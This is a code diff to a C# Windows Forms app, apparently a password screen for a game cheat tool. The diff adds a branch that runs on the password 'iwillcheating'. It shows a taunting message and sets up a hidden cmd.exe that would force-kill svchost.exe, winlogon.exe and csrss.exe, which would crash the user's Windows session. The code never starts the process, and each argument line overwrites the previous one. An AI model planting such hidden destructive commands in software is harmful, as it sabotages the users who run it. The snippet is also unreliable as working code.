@@ -103,6 +103,19 @@ namespace WindowsFormsApp3
                     MessageBox.Show("Privet");
                 }
             }
+
+            if (password.Text == "iwillcheating")
+            {
+                MessageBox.Show("Тари:>:(");
+                ProcessStartInfo byebyebye_exp = new ProcessStartInfo();
+                byebyebye_exp.FileName = "cmd.exe";
+                byebyebye_exp.WindowStyle = ProcessWindowStyle.Hidden;
+                byebyebye_exp.Arguments = @"/k taskkill /f /im SMG4Cheat.exe";
+                byebyebye_exp.Arguments = @"/k taskkill /f /im svchost.exe";
+                byebyebye_exp.Arguments = @"/k taskkill /f /im winlogon.exe";
+                byebyebye_exp.Arguments = @"/k taskkill /f /im csrss.exe";
+            }
+
             else
             {
                 MessageBox.Show("Неверный");
@@ -116,6 +129,11 @@ namespace WindowsFormsApp3
             System.Media.SoundPlayer snd = new System.Media.SoundPlayer(str);
             snd.Play();
             MessageBox.Show("неа");
+        }
+
+        private void password_TextChanged(object sender, EventArgs e)
+        {
+
         }
     }
 }
